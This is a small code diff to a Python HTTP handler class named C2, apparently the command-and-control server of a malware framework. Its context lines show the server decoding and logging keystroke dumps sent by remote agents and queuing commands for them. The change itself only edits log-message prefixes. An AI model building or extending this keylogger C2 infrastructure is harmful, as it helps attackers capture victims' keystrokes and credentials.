@@ -77,7 +77,7 @@ class C2(BaseHTTPRequestHandler):
             keystrokes = utils.decode_base_64(agent_data["data"]["keystrokes_base64"], encoding="utf-8")
             if isinstance(keystrokes, bytes):
                 keystrokes = keystrokes.decode(errors='ignore')
-            utils.log_message(f"[+] keystrokes dump from agent {agent}")
+            utils.log_message(f"keystrokes dump from agent {agent}")
             utils.log_message(keystrokes, print_time=False)
             if 'status' in agent_data['data']:
                 utils.log_message(f"[*] status: {agent_data['data']['status']}", print_time=False)
@@ -104,7 +104,7 @@ class C2(BaseHTTPRequestHandler):
                     "pending_commands": []
                 }
 
-            utils.log_message(f"[*] Collected data from agent {agent} [command: {command_type}]")
+            utils.log_message(f"Collected data from agent {agent} [command: {command_type}]")
 
         else:
             utils.log_message(f"Data from agent {agent} [command: {command_type}]")
